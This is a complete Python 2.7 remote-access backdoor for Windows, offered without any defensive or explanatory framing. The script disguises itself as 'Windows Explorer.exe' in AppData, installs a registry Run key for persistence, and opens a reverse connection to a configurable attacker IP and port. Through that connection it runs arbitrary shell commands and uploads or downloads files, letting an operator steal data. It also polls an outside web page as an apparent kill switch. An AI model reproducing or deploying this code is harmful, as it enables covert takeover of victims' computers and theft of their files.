#!/usr/bin/env python2.7
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import requests

IP = "192.168.1.31" # change this
PORT = 4445 # change this (Integer Only)



class MotherFucker():
    def __init__(self, ip, port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def persistence(self):
        location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_dir(self, path):
        os.chdir(path)
        return "Changed dir to %s" % path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            decoded_file = base64.b64decode(content)
            file.write(decoded_file)
            return "Uploaded Successfully !"

    def read_file(self, path):
        with open(path, "rb") as file:
            encoded_file = base64.b64encode(file.read())
            return encoded_file

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            rcvd_cmd = self.json_recv()
            try:
                if rcvd_cmd[0] == "exit":
                    self.connection.close()
                    sys.exit() 
                elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
                    cmd_rslt = self.change_working_dir(rcvd_cmd[1])
                elif rcvd_cmd[0] == "download":
                    cmd_rslt = self.read_file(rcvd_cmd[1])
                elif rcvd_cmd[0] == "upload":
                    cmd_rslt = self.write_file(rcvd_cmd[1], rcvd_cmd[2])
                else:
                    cmd_rslt = self.execute_system_command(rcvd_cmd)
            except Exception:
                cmd_rslt = "[-] Error During Command Execution."
            self.json_send (cmd_rslt)


def get_status():
    s = requests.get('https://poggerpussy.github.io').text
    #status = re.sub(r"<.*?>",'', s)
    if s == "true":
        return True
    return False

try:
    jja213415 = MotherFucker(IP, PORT)
    jja213415.run()
except Exception:
    sys.exit()
